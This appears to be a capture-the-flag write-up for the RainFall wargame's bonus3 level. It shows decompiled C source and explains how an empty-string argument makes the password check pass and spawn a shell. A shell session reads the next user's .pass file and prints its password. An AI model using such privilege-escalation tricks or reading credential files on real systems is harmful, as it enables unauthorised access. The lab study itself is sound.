# Bonus 3

<h3>source.c</h3>

```console
int main(int argc, char** argv) {
	char str[132];
	void* file = fopen("/home/user/end/.pass", "r");

	memset(str, 0, 132);
	if ((file == 0) || (argc != 2)) {
    return(-1);
  }
	else
	{
		fread(str, 1, 66, f);
		str[65] = 0;
		str[atoi(argv[1])] = 0;
		fread(&str[66], 1, 65, f);
		fclose(f);
		if (strcmp(str, argv[1]) == 0) {
      execl("/bin/sh", "sh", NULL);
    }
		else {
      puts(&str[66]);
    }
	}
	return (0);
}
```

<h3>Analysis</h3>

In this program, we can see that it is taking only 1 arg,

At the start of the program, it is reading the `.pass` and save it into the `file` pointer

After checking that the `file` contain no error and the user have put only 1 arg for the program, it will put the content of the file into the local str variable

Next, it will assign a `0` of null string into index 65 of the `str` and another `0` at the index gotten by the atoi of `argv[1]`

This could means the user can cut short the content of `str` depending on the input it gave to the program.

The next fread is trying to read from the `file` again and save it on the index 66 onward, but not sure what it is trying to achieve

After the file is close, the program will do some comparison between the `str` and `argv[1]` to see if there are equal

Since `str` is potentiatially storing the `pass`, we will have no way to get the `argv[1]` right without knowing what is the `pass`

Our goal will be to make `str` and `argv[1]` as equal so we could spawn the shell

<h3>Exploit</h3>

Since `argv[1]` will be converted into int and be used as the index to assign `0` to the `str`

We could potentially cut the `str` short by putting `0` as the input for `argv[1]`

We can try to put `0` for the input, but then the result will become like this

```console
str[atoi(argv[1])] = 0;
str[atoi(0)] = 0;
str[0] = 0;
str[0] = '\0' or end of string

argv[1] = "0" the char of 0
```

This will not work because they are not the same

But instead we can put `""` as the input for `argv[1]` an this will be the result

```console
str[atoi(argv[1])] = 0;
str[atoi("")] = 0;              -> atoi("") will return 0 as there is nothing to be converted
str[0] = 0;
str[0] = '\0' or end of string

argv[1] = ""  there is nothing here
```

`strcmp(str, argv[1])` will be equal to 0, as there will be nothing compare to nothing, so they are equal

```console
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
bonus3@RainFall:~$ su end
Password:
end@RainFall:~$ ls -l
total 4
-rwsr-s---+ 1 end users 26 Sep 23  2015 end
end@RainFall:~$ cat end
Congratulations graduate!
```